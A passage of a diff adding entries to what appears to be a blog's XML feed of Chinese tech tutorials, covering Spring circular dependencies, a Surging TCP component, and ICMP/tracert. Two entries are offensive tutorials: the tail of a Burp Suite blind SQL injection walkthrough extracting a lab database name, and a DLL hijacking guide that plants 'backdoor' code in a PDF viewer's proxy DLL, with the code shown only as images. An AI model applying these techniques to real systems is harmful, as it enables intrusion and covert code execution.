set不会显示第二个变量)<br><img src="https://static.luozhinet.com/71/3debe03fff5fc6ad52c12f8c033584&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="8.png"><br>我们选择Numbers 设置为1~127 递增1<br><img src="https://static.luozhinet.com/c4/00b579070700a982a17aa411a887bf&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="9.png"><br>点击 <strong>Start attack</strong> 开始爆破<br><img src="https://static.luozhinet.com/5c/5ff8bce99e364d86187b9d21208793&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="10.png"><br>我们查看返回长度不一样的包，这里看Payload1</p><p><code>1对应的ASCII码为119   2对应的ASCII码为101   3对应的ASCII码为98   4对应的ASCII码为117   5对应的ASCII码为103</code></p><p><img src="https://static.luozhinet.com/e4/4e0a2c72c82872a8ce7a9af6a6a14b&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="11.png"></p><p>得到数据库名为<code>webug</code></p><p><img src="https://static.luozhinet.com/5c/5809aad71be86880ed018dc97ca841"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 长度 </tag>
+            
+            <tag> ascii </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> 对应 </tag>
+            
+            <tag> 变量 </tag>
+            
+            <tag> 数据库 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>简单实现程序DLL劫持</title>
+      <link href="/posts/d2cb74312811/"/>
+      <url>/posts/d2cb74312811/</url>
+      
+        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="**0x00 前言"></a>**0x00 前言</h3><p>**</p><p>程序启动会调用固定的.dll文件，通过特定的手法将木马代码和进程注入到可被劫持的DLL文件中，当程序正常启动，我们代码也会秘密执行。</p><h3 id="0x01-利用过程"><a href="#0x01-利用过程" class="headerlink" title="**0x01 利用过程"></a>**0x01 利用过程</h3><p>**</p><p>用到的工具</p><blockquote><p><code>1、Aheadlib   2、Visual Studio</code></p></blockquote><p>用美图看看Pdf来测试，朋友们可以拿这个练手，毕竟只有一个<code>.dll</code>文件，小傻瓜都知道是调用的这个<code>dll</code>来启动程序的</p><p><img src="https://static.luozhinet.com/af/eda6d71296cd86268d6552953dc1c7&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>找到易劫持的dll文件，打开<code>Aheadlib</code>，引入<br>注意这里设置的原始<code>dll</code>文件名，记住了最后正常<code>dll</code>名字要修改成这个</p><p><img src="http://139.198.176.82:86/data/images/2022-05-24/a3d0343e77de9e860931119914b75ca4.jpg.png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>点击生成会在程序目录下生成一个<code>.cpp</code>文件</p><p><img src="https://static.luozhinet.com/31/26c1b33e909594530d62653db8cfaa&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h5 id="0x02-修改劫持代码，注入进程后门"><a href="#0x02-修改劫持代码，注入进程后门" class="headerlink" title="0x02 修改劫持代码，注入进程后门"></a><strong>0x02 修改劫持代码，注入进程后门</strong></h5><p>打开<code>VisualStudio</code>，添加一个动态链接库，专门用于生成<code>dll</code>的，将生成的代码全选粘贴进去，注意</p><blockquote><p><code>#include &quot;pch.h&quot;</code></p></blockquote><p>不要删，这是定义<code>DLL</code>程序的入口点很重要</p><p><img src="https://static.luozhinet.com/0c/e308388d0d1d70475886da2b71b8ff&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://static.luozhinet.com/fe/447340013634403207756d3d42944b&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>在主函数里加入后门代码（注入木马进程) 调用计算器来测试</p><p><img src="https://static.luozhinet.com/53/9e2616b7d19deae29f2380bdd7c09b&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>生成，ok没有报错</p><p><img src="http://139.198.176.82:86/data/images/2022-05-24/2a934672d4646a09f660b8d08208155c.jpg.png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>把<code>dll</code>赋值到程序目录改名为<code>pdfcore.dll</code> 原文件改为<code>pdfcoreOrg.dll</code></p><p><img src="https://static.luozhinet.com/a0/bc629b04228d2a67b1fb6f1d53a079&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>打开程序，弹出计算器</p><p><img src="https://static.luozhinet.com/f3/0ddc3a03f7675fc10ad8819c4af638&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://static.luozhinet.com/76/01e03df3f413b0a5131919b70d564a&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://static.luozhinet.com/92/db16d707d6a0ce81399247e8307125&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件 </tag>
+            
+            <tag> 程序 </tag>
+            
+            <tag> 代码 </tag>
+            
+            <tag> 生成 </tag>
+            
+            <tag> dll </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>画图带你彻底弄懂三级缓存和循环依赖的问题</title>
+      <link href="/posts/9835c5ee723e/"/>
+      <url>/posts/9835c5ee723e/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://static.luozhinet.com/55/dc8be251b6f726f90d68d062fb3690"></p><p>大家好。我们都知道，Spring可以通过三级缓存解决循环依赖的问题，这也是面试中很常见的一个面试题，本文就来着重讨论一下有关循环依赖和三级缓存的问题。</p><p>一、什么是循环依赖</p><p>大家平时在写业务的时候应该写过这样的代码。<img src="https://static.luozhinet.com/d8/f22acc0b63a10c00396cb76bc8e427"></p><p> <img src="https://static.luozhinet.com/c1/280841d5b27479698ffe8ec02e5662"></p><p> <img src="https://static.luozhinet.com/18/52d787d7461933b8f219c0aa2a0076"></p><p>其实这种类型就是循环依赖，就是AService 和BService两个类相互引用。</p><p>二、三级缓存可以解决的循环依赖场景</p><p>如上面所说，大家平时在写这种代码的时候，项目其实是可以起来的，也就是说其实三级缓存是可以解决这种循环依赖的。</p><p>当然除了这种字段注入，set注入也是可以解决的，代码如下。</p><p><img src="https://static.luozhinet.com/34/e400f6e2d4e2979b2273a7cad3cb2a"></p><p>接下来就来探究三级缓存是如何解决这种循环依赖的？</p><p>三、Spring的Bean是如何创建出来的</p><p>本文所说的Bean和对象可以理解为同一个意思。</p><p>先说如何解决循环依赖之前，先来了解一下一个Bean创建的大致流程。为什么要说Bean的创建过程，因为循环依赖主要是发生在Bean创建的过程中，知道Bean是如何创建的，才能更好的理解三级缓存的作用。</p><p>其实Spring Bean的生命周期源码剖析我也在微信公众号 三友的java日记 中发过，并且有简单的提到三级缓存，有兴趣的同学可以在关注公众号之后回复 Bean 即可获取文章链接，里面有Bean创建过程更详细的说明。这里我简单画一张图来说一下。</p><p><img src="http://139.198.176.82:86/data/images/2022-05-24/3488fd1c48472e5f68aaad85f3497c44.jpg.png"></p><p>其实图里的每个阶段还可以分为一些小的阶段，我这里就没画出来了。</p><p>来说一下每个阶段干了什么事。</p><ul><li>BeanDefinition的读取阶段：我们在往Spring容器注入Bean的时候，一般会通过比如xml方式，@Bean注解的方式，@Component注解的方式，其实不论哪一种，容器启动的时候都会去解析这些配置，然后为每个Bean生成一个对应的BeanDefinition，这个BeanDefinition包含了这个Bean的创建的信息，Spring就是根据BeanDefinition去决定如何创建一个符合你要求的Bean</li><li>Bean的实例化阶段：这个阶段主要是将你配置的Bean根据Class的类型创建一个对象出来</li><li>Bean的属性赋值阶段：这个阶段主要是用来处理属性的赋值，比如@Autowired注解的生效就是在这个阶段的</li><li>Bean的初始化阶段：这个阶段主要是回调一些方法，比如你的类实现了InitializingBean接口，那么就会回调afterPropertiesSet方法，同时动态代理其实也是在这个阶段完成的。</li></ul><p>其实从这可以看出，一个Spring Bean的生成要分为很多的阶段，只有这些事都处理完了，这个Bean才是完完全全创建好的Bean，也就是我们可以使用的Bean。</p><p>四、三级缓存指的是哪三级缓存</p><p>这里直接上源码</p><p><img src="https://static.luozhinet.com/9f/8af669aa4bd4bf2f64cedb783b02ac"></p><p>第一级缓存：singletonObjects</p><p>存放已经完完全全创建好的Bean，什么叫完完全全创建好的？就是上面说的是，所有的步骤都处理完了，就是创建好的Bean。一个Bean在产的过程中是需要经历很多的步骤，在这些步骤中可能要处理@Autowired注解，又或是处理@Transcational注解，当需要处理的都处理完之后的Bean，就是完完全全创建好的Bean，这个Bean是可以用来使用的，我们平时在用的Bean其实就是创建好的。</p><p>第二级缓存：earlySingletonObjects</p><p>早期暴露出去的Bean，其实也就是解决循环依赖的Bean。早期的意思就是没有完完全全创建好，但是由于有循环依赖，就需要把这种Bean提前暴露出去。其实 早期暴露出去的Bean 跟 完完全全创建好的Bean 他们是同一个对象，只不过早期Bean里面的注解可能还没处理，完完全全的Bean已经处理了完了，但是他们指的还是同一个对象，只不过它们是在Bean创建过程中处于的不同状态，如果早期暴露出去的Bean跟完完全全创建好的Bean不是同一个对象是会报错的，项目也就起不来，这个不一样导致报错问题，这里我会结合一个案例再来写一篇文章，这里不用太care，就认为是一样的。</p><p>第三级缓存：singletonFactories</p><p>存的是每个Bean对应的ObjectFactory对象，通过调用这个对象的getObject方法，就可以获取到早期暴露出去的Bean。</p><p>注意：这里有个很重要的细节就是三级缓存只会对单例的Bean生效，像多例的是无法利用到三级缓存的，通过三级缓存所在的类名DefaultSingletonBeanRegistry就可以看出，仅仅是对SingletonBean也就是单例Bean有效果。</p><p><img src="https://static.luozhinet.com/60/781a3a29a311b2380ed9d2614273df"></p><p>五、三级缓存在Bean生成的过程中是如何解决循环依赖的</p><p>这里我假设项目启动时先创建了AService的Bean，那么就会根据Spring Bean创建的过程来创建。</p><p>在Bean的实例化阶段，就会创建出AService的对象，此时里面的@Autowired注解是没有处理的，创建出AService的对象之后就会构建AService对应的一个ObjectFactory对象放到三级缓存中，通过这个ObjectFactory对象可以获取到AService的早期Bean。</p><p><img src="https://static.luozhinet.com/40/a8ad1bb23fd9ba153e9e5b89fddccb"></p><p>然后AService继续往下走，到了某一个阶段，开始处理@Autowired注解，要注入BService对象，如图</p><p><img src="https://static.luozhinet.com/eb/90550d1c266f1ff17ff0e49d509482"></p><p>要注入BService对象，肯定要去找BService对象，那么他就会从三级缓存中的第一级缓存开始依次查找有没有BService对应的Bean，肯定都没有啊，因为BService还没创建呢。没有该怎么办呢？其实很好办，没有就去创建一个么，这样不就有了么。于是AService的注入BService的过程就算暂停了，因为现在得去创建BService，创建之后才能注入给AService。</p><p>于是乎，BService就开始创建了，当然他也是Spring的Bean，所以也按照Bean的创建方式来创建，先实例化一个BService对象，然后缓存对应的一个ObjectFactory到第三级缓存中，然后就到了需要处理@Autowired注解的时候了，如图。</p><p><img src="https://static.luozhinet.com/57/8308e4f3ef647870324ba5801749ff"></p><p>@Autowired注解需要注入AService对象。注入AService对象，就需要先去拿到AService对象，此时也会一次从三级缓存查有没有AService。</p><p>先从第一级查，有没有创建好的AService，肯定没有，因为AService此时正在在创建（因为AService在创建的过程中需要注入BService才去创建BService的，虽然此刻代码正在创建BService，但是AService也是在创建的过程中，只不过暂停了，只要BService创建完，AService会继续往下创建）；第一级缓存没有，那么就去第二级看看，也没有，没有早期的AService；然后去第三级缓存看看有没有AService对应的ObjectFactory对象，惊天的发现，竟然有(上面提到过，创建出AService的对象之后，会构建AService对应的一个ObjectFactory对象放到三级缓存中)，那么此时就会调用AService对应的ObjectFactory对象的getObject方法，拿到早期的AService对象，然后将早期的AService对象放到二级缓存，为什么需要放到二级缓存，主要是怕还有其他的循环依赖，如果还有的话，直接从二级缓存中就能拿到早期的AService对象。</p><p><img src="https://static.luozhinet.com/e9/7888a75ac76e5de3b9a56ab854952e"></p><p>虽然是早期的AService对象，但是我前面说过，仅仅只是早期的AService对象可能有些Bean创建的步骤还没完成，跟最后完完全全创建好的AService Bean是同一个对象。</p><p>于是接下来就把早期的AService对象注入给BService。</p><p><img src="https://static.luozhinet.com/08/491f6466dfdca4dfa33f060c82119f"></p><p>此时BService的@Autowired注解注入AService对象就完成了，之后再经过其他阶段的处理之后，BService对象就完完全全的创建完了。</p><p>BService对象创建完之后，就会将BService放入第一级缓存，然后清空BService对应的第三级缓存，当然也会去清空第二级缓存，只是没有而已，至于为什么清空，很简单，因为BService已经完全创建好了，如果需要BService那就在第一级缓存中就能查找到，不需要在从第二级或者第三级缓存中找到早期的BService对象。</p><p><img src="https://static.luozhinet.com/ee/a27553a7cfbcd77710f19e303c1e8a"></p><p>BService对象就完完全全的创建完之后，那么接下来该干什么呢？此时当然继续创建AService对象了，你不要忘了为什么需要创建BService对象，因为AService对象需要注入一个BService对象，所以才去创建BService的，那么此时既然BService已经创建完了，那么是不是就应该注入给AService对象了？所以就会将BService注入给AService对象，这下就明白了，BService在构建的时候，已经注入了AService，虽然是早期的AService，但的确是AService对象，现在又把BService注入给了AService，那么是不是已经解决了循环依赖的问题了，AService和BService都各自注入了对方，如图。</p><p><img src="http://139.198.176.82:86/data/images/2022-05-24/fdd2c7a14514b6edf36c0e67f3990b8a.jpg"></p><p>然后AService就会跟BService一样，继续处理其它阶段的，完全创建好之后，也会清空二三级缓存，放入第一级缓存。</p><p><img src="https://static.luozhinet.com/6c/db757ad8b3921443f02d347b7c0749"></p><p>到这里，AService和BService就都创建好了，循环依赖也就解决了。</p><p>这下你应该明白了三级缓存的作用，主要是第二级和第三级用来存早期的对象，这样在有循环依赖的对象，就可以注入另一个对象的早期状态，从而达到解决循环依赖的问题，而早期状态的对象，在构建完成之后，也就会成为完完全全可用的对象。</p><p>六、三级缓存无法解决的循环依赖场景</p><p>1）构造器注入无法解决循环依赖</p><p>上面的例子是通过@Autowired注解直接注入依赖的对象，但是如果通过构造器注入循环依赖的对象，是无法解决的，如代码下</p><p><img src="https://static.luozhinet.com/cb/d5400bfd3e170d87c0e9c09e51186c"></p><p>构造器注入就是指创建AService对象的时候，就传入BService对象，而不是用@Autowired注解注入BService对象。</p><p>运行结果</p><p><img src="https://static.luozhinet.com/95/3b7cf7debff17a415ea23a80b20710"></p><p>启动时就会报错，所以通过构造器注入对象就能避免产生循环依赖的问题，因为如果有循环依赖的话，那么就会报错。</p><p>至于三级缓存为什么不能解决构造器注入的问题呢？其实很好理解，因为上面说三级缓存解决循环依赖的时候主要讲到，在AService实例化之后，会创建对应的ObjectFactory放到第三级缓存，发生循环依赖的时候，可以通过ObjectFactory拿到早期的AService对象；而构造器注入，是发生在实例化的时候，此时还没有AService对象正在创建，还没完成，压根就还没执行到往第三级添加对应的ObjectFactory的步骤，那么BService在创建的时候，就无法通过三级缓存拿到早期的AService对象，拿不到怎么办，那就去创建AService对象，但是AService不是正在创建么，于是会报错。</p><p>2）注入多例的对象无法解决循环依赖</p><p><img src="https://static.luozhinet.com/da/afce6814b4233cb5a312960e686df8"></p><p><img src="https://static.luozhinet.com/b8/d142a3cc0728379e70c3712379b102"></p><p>启动引导类</p><p><img src="https://static.luozhinet.com/70/bc35e49036e927d0dd18f5a9c44d6c"></p><p>要获取AService对象，因为多例的Bean在容器启动的时候是不会去创建的，所以得去获取，这样就会创建了。</p><p>运行结果</p><p><img src="https://static.luozhinet.com/63/325a9cab69b81b9cd0fc2131cd6e16"></p><p>为什么不能解决，上面在说三级缓存的时候已经说过了，三级缓存只能对单例Bean生效，那么多例是不会起作用的，并且在创建Bean的时候有这么一个判断，那就是如果出现循环依赖并且是依赖的是多例的Bean，那么直接抛异常，源码如下</p><p><img src="https://static.luozhinet.com/9e/b6d4acbf1982132c3e11651d11cc08"></p><p>注释其实说的很明白，推测出现了循环依赖，抛异常。</p><p>所以上面提到的两种循环依赖的场景，之所以无法通过三级缓存来解决，是因为压根这两种场景就无法使用三级缓存，所以三级缓存肯定解决不掉。</p><p>七、不用三级缓存，用二级缓存能不能解决循环依赖</p><p>遇到这种面试题，你就跟面试官说，如果行的话，Spring的作者为什么不这么写呢？</p><p>哈哈，开个玩笑，接下来说说到底为什么不行。</p><p>这里我先说一下前面没提到的细节，那就是通过ObjectFactory获取的Bean可能是两种类型，第一种就是实例化阶段创建出来的对象，还是一种就是实例化阶段创建出来的对象的代理对象。至于是不是代理对象，取决于你的配置，如果添加了事务注解又或是自定义aop切面，那就需要代理。这里你不用担心，如果这里获取的是代理对象，那么最后完全创建好的对象也是代理对象，ObjectFactory获取的对象和最终完全创建好的还是同一个，不是同一个肯定会报错，所以上面的理论依然符合，这里只是更加的细节化。</p><p>有了这个知识点之后，我们就来谈一下为什么要三级缓存。</p><p>第一级缓存，也就是缓存完全创建好的Bean的缓存，这个缓存肯定是需要的，因为单例的Bean只能创建一次，那么肯定需要第一级缓存存储这些对象，如果有需要，直接从第一级缓存返回。那么如果只能有二级缓存的话，就只能舍弃第二级或者第三级缓存。</p><p>假设舍弃第三级缓存</p><p>舍弃第三级缓存，也就是没有ObjectFactory，那么就需要往第二缓存放入早期的Bean，那么是放没有代理的Bean还是被代理的Bean呢？</p><p>1）如果直接往二级缓存添加没有被代理的Bean，那么可能注入给其它对象的Bean跟最后最后完全生成的Bean是不一样的，因为最后生成的是代理对象，这肯定是不允许的；</p><p>2）那么如果直接往二级缓存添加一个代理Bean呢？</p><ul><li>假设没有循环依赖，提前暴露了代理对象，那么如果跟最后创建好的不一样，那么项目启动就会报错，</li><li>假设没有循环依赖，使用了ObjectFactory，那么就不会提前暴露了代理对象，到最后生成的对象是什么就是什么，就不会报错，</li><li>如果有循环依赖，不论怎样都会提前暴露代理对象，那么如果跟最后创建好的不一样，那么项目启动就会报错</li></ul><p>通过上面分析，如果没有循环依赖，使用ObjectFactory，就减少了提前暴露代理对象的可能性，从而减少报错的可能。</p><p>假设舍弃第二级缓存</p><p>假设舍弃第二级缓存，也就是没有存放早期的Bean的缓存，其实肯定也不行。上面说过，ObjectFactory其实获取的对象可能是代理的对象，那么如果每次都通过ObjectFactory获取代理对象，那么每次都重新创建一个代理对象，这肯定也是不允许的。</p><p>从上面分析，知道为什么不能使用二级缓存了吧，第三级缓存就是为了避免过早地创建代理对象，从而避免没有循环依赖过早暴露代理对象产生的问题，而第二级缓存就是防止多次创建代理对象，导致对象不同。</p><p>本文完。</p><p>如果觉得这篇文章对你有所帮助，还请帮忙点赞、在看、转发给更多的人，码字不易，非常感谢！</p><h2 id="欢迎关注公众号-三友的java日记，更多技术干货及时获得。"><a href="#欢迎关注公众号-三友的java日记，更多技术干货及时获得。" class="headerlink" title="欢迎关注公众号 三友的java日记，更多技术干货及时获得。"></a>欢迎关注公众号 三友的java日记，更多技术干货及时获得。</h2><p><strong>往期热门文章推荐</strong></p><ul><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247485437&idx=1&sn=d88a7febec0148f5681ca7c728fd8990&chksm=cfd95435f8aedd234a0019f8a0f39832cd2c5a3c7401643e5b666bb141db1fe83e7ea6ab670f&scene=21#wechat_redirect">万字+28张图带你探秘小而美的规则引擎框架LiteFlow</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484636&idx=1&sn=834df6a5bf598819d30b2b8f6d42d242&chksm=cfd95714f8aede0210ad9d215b69b25851c17cfb02cab849c6bccea49868b66adda596487b13&scene=21#wechat_redirect">7000字+24张图带你彻底弄懂线程池</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484211&idx=1&sn=13b1cb0832bfae9a6d2369193700fd19&chksm=cfd950fbf8aed9ed473a0e170480770c311f1b637607332a0df15f32e2e9a446f8bc97f0b295&scene=21#wechat_redirect">【SpringCloud原理】OpenFeign原来是这么基于Ribbon来实现负载均衡的</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484202&idx=1&sn=a89f4c393ca2d09b263aab79e4ebfd3d&chksm=cfd950e2f8aed9f4e6f49d93b8120d93382899b7d5eccab06b26c76042abf89a98653410b1d1&scene=21#wechat_redirect">【SpringCloud原理】Ribbon核心组件以及运行原理源码剖析</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484185&idx=1&sn=efb3a1f459be9970126269234ff813e7&chksm=cfd950d1f8aed9c7c9ec6bc8b00c376d9777aa6d6aa2b93ccf6a4b4376adbed8c4f3e1e3754b&scene=21#wechat_redirect">【SpringCloud原理】OpenFeign之FeignClient动态代理生成原理</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484124&idx=1&sn=8133290e6dd4c55a310c3d4be1ce0fd7&chksm=cfd95114f8aed802fbdcff8990082ef96195e6b9dcfaf357fc23a0f85045622b8cdaddead1f4&scene=21#wechat_redirect">synchronized真的很重么？</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484115&idx=1&sn=ae26f9eff454497d6aec66a276b5f3e6&chksm=cfd9511bf8aed80d3ef0e319c8b53b436cb1a294081ace96362524ce12a0d60b2785c72473cf&scene=21#wechat_redirect">一文带你看懂Java中的Lock锁底层AQS到底是如何实现的</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 创建 </tag>
+            
+            <tag> 对象 </tag>
+            
+            <tag> 处理 </tag>
+            
+            <tag> 代码 </tag>
+            
+            <tag> 生成 </tag>
+            
+            <tag> 同学 </tag>
+            
+            <tag> bean </tag>
+            
+            <tag> aservice </tag>
+            
+            <tag> bservice </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>基于surging网络组件多协议适配的平台化发展</title>
+      <link href="/posts/359588524740/"/>
+      <url>/posts/359588524740/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="**前言"></a>**前言</h2><p>**</p><p>               Surging 发展已经有快6年的时间，经过这些年的发展，功能框架也趋于成熟，但是针对于商业化需求还需要不断的打磨，前段时间客户找到我想升级成平台化，针对他的需求我们讨论了很久，他的一些需求想法还是非常先进的，针对于现在surging 还有很多需要研发打磨，后面因为时间成本的关系我拒绝了他，我也打算后面慢慢的将surging升级为平台化以便支持物联网，流媒体等业务场景，可以通过统一定义，统一管理来配置构建各种业务场景，而web网关，设备网关，流媒体网关等各种类型的网关可以通过配置添加删除网络协议组件，以便可以支持多种协议适配，设配管理和配置规则引擎等业务场景。 今天所要讲的是以TCP组件为范本如何进行优化构建成平台化多协议适配。</p><h2 id="构建TCP组件"><a href="#构建TCP组件" class="headerlink" title="构建TCP组件"></a><strong>构建TCP组件</strong></h2><p> 首先来看看如何创建配置启动协议组件，以TCP协议组件为例，以下代码用于创建具有配置属性的TCP网络组件，并配置规则引擎脚本以解码消息</p><p>  var config &#x3D;new Dictionary&lt;string, object&gt;();<br>            config.Add(“script”, @”parser.Fixed(4).Handler(<br>                  function(buffer){<br>                    var buf &#x3D; BytesUtils.Slice(buffer,1,4);<br>                    parser.Fixed(buffer.ReadableBytes).Result(buf);<br>             }).Handler(<br>                    function(buffer){parser.Fixed(8).Result(buffer);}<br>            ).Handler(function(buffer){<br>                    parser.Result(‘处理完成’,’gb2312’).Complete();<br>                 }<br>             )”);<br>            var network&#x3D;  serviceProvider.ServiceProvoider.GetInstances&lt;INetworkProvider<TcpServerProperties>&gt;().CreateNetwork(new TcpServerProperties<br>           {<br>               ParserType = PayloadParserType.Script,<br>               PayloadType = PayloadType.String,<br>               Host = “127.0.0.1”,<br>               Port = 322,<br>               ParserConfiguration = config<br>           });<br>            network.StartAsync();</p><p>以下代码用于创建具有配置属性的TCP网络组件，并配置direct解码消息</p><p>  var network1 &#x3D; serviceProvider.ServiceProvoider.GetInstances&lt;INetworkProvider<TcpServerProperties>&gt;().CreateNetwork(new TcpServerProperties<br>            {<br>                ParserType = PayloadParserType.Direct,<br>                PayloadType = PayloadType.String,<br>                Host = “127.0.0.1”,<br>                Port = 321<br>            });<br>            network1.StartAsync();</p><p>还有两种类型的payload parser：fixedlength和delimited，这里就不依次说明了，直接通过添加更改ParserType属性就能配置相关的parse</p><p>创建Tcp服务</p><p> public class TcpService : TcpBehavior, ITcpService<br>    {<br>        private readonly IDeviceProvider _deviceProvider;<br>        public TcpService(IDeviceProvider deviceProvider)<br>        {<br>            _deviceProvider = deviceProvider;<br>        }</p><pre><code>    public override void Load(string clientId,TcpServerProperties tcpServerProperties)    &#123;      var deviceStatus =\_deviceProvider.IsConnected(clientId);           this.Parser.HandlePayload().Subscribe(buffer=&gt;ParserBuffer(buffer));    &#125;    public override void DeviceStatusProcess(DeviceStatus status, string clientId, TcpServerProperties tcpServerProperties)    &#123;        //throw new NotImplementedException();    &#125;    public async Task ParserBuffer(IByteBuffer buffer)    &#123;        List&lt;string\&gt; result = new List&lt;string\&gt;();        while (buffer.ReadableBytes &gt; 0)        &#123;            result.Add(buffer.ReadString(this.Parser.GetNextFixedRecordLength(),                Encoding.GetEncoding(&quot;gb2312&quot;)));        &#125;        // var str= buffer.ReadString(buffer.ReadableBytes, Encoding.UTF8);                var byteBuffer=  Unpooled.Buffer();        byteBuffer.WriteString(&quot;\\r\\n&quot;, Encoding.UTF8);         byteBuffer.WriteString(&quot;处理完成&quot;, Encoding.GetEncoding(&quot;gb2312&quot;));        await Sender.SendAndFlushAsync(byteBuffer);        buffer.Release();        //  await Sender.SendAndFlushAsync(&quot;消息已接收&quot;,Encoding.GetEncoding(&quot;gb2312&quot;));        this.Parser.Close();     &#125;&#125;</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="**测试"></a>**测试</h2><p>**</p><p>规则引擎脚本解码测试</p><p><img src="https://static.luozhinet.com/14/354920c4595772ee720278e9885fe3"></p><p> direct 解码测试</p><p><img src="https://static.luozhinet.com/2a/81bde888c91f9e9a8b980add43457b"></p><h2 id="总结"><a href="#总结" class="headerlink" title="****总结"></a>****总结</h2><hr><p>最近忙着对于rtsp 进行bug 的修复和测试， 这样流媒体业务场景除了httpflv,rtmp 协议外，也能针对于rtsp协议的支持，协议之间互相也能进行转发， 对于rtsp 完成后，surging 将转继续优化构建平台化，年底也会陆续推出后台系统，基于Node-Red 可视化数据流的服务规则引擎编排。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络 </tag>
+            
+            <tag> tcp </tag>
+            
+            <tag> 后台 </tag>
+            
+            <tag> 代码 </tag>
+            
+            <tag> buffer </tag>
+            
+            <tag> parser </tag>
+            
+            <tag> var </tag>
+            
+            <tag> encoding </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ICMP</title>
+      <link href="/posts/f2ac39f8aebf/"/>
+      <url>/posts/f2ac39f8aebf/</url>
+      
+        <content type="html"><![CDATA[<p>ICMP</p><ul><li>ICMP用来传递差错控制，查询等信息。</li><li>ICMP Echo消息常用于诊断源和目的之间的网络连通性，同时还可以提供其他信息，如报文往返时间等。</li><li>当网络设备无法保证访问目标网络时，会自动发送ICMP目的不可达报文到发送端设备</li><li>type表示ICMP消息类型，code表示同一消息类型中的不同信息。</li></ul><p>　　<img src="https://static.luozhinet.com/67/976a2029ff1e1f5a8cc64efdb59dac"></p><ul><li> ICMP的一个典型应用是ping。ping是检测网络连通性的常用工具，同时也能够收集其他相关信息。用户可以在ping命令中指定不同参数，如ICMP报文长度、发送ICMP报文个数、等待回复响应的超时时间等，设备根据配置的参数来构造并发送ICMP报文，进行ping测试。</li><li>ping常用的配置参数说明如下：</li><li>1、-a source-ip-address指定发送icmp ECHO-REQUEST报文的源IP地址。如果不指定源IP地址，将采用出接口的IP地址作为ICMP echo-request报文发送的源地址。</li><li>2、-c count指定发送ICMP echo-request报文次数。缺省情况下发送5个ICMP echo-request报文。</li><li>3、-h ttl-value 指定的值。缺省值是255</li><li>4、-t timeout指定发送完ICMP echo-request后，等待ICMP echo-replay的超时时间。</li></ul><p>Tracert</p><p>ICMP的另一个典型应用是Tracert。Tracert基于报文头中的ttl值来逐跳跟踪报文的转发路径。为了跟踪到达某特定目的地地址的路径，源端首先将报文的ttl值设置为1.该报文到达第一个节点后，TTL超时，于是该节点向源端发送TTL超时消息，消息中携带时间戳。然后源端将报文的ttl值设置为2，报文到达第二个节点后超时，该节点同样返回TTL超时信息，以此类推，直到报文到达目的地。这样，源端根据返回的报文中的信息可以跟踪到报文经过的每一个节点，并根据时间戳信息计算往返时间。Tracert是检测网络丢包及时延的有效手段，同时可以帮助管理员发现网络中的路由环路。</p><ul><li>Tracert常用的配置参数说明如下<img src="https://static.luozhinet.com/40/7b7d56ff5426b54532b3b7d19c8c85"></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 长度 </tag>
+            
+            <tag> 网络 </tag>
+            
+            <tag> 地址 </tag>
+            
+            <tag> 发送 </tag>
+            
+            <tag> ping </tag>
+            
+            <tag> 个数 </tag>
+            
+            <tag> icmp </tag>
+            
+            <tag> ttl </tag>
+            
+            <tag> tracert </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IP地址、子网掩码、网关、DNS的介绍</title>
+      <link href="/posts/022f652505bc/"/>
+      <url>/posts/022f652505bc/</url>
+      
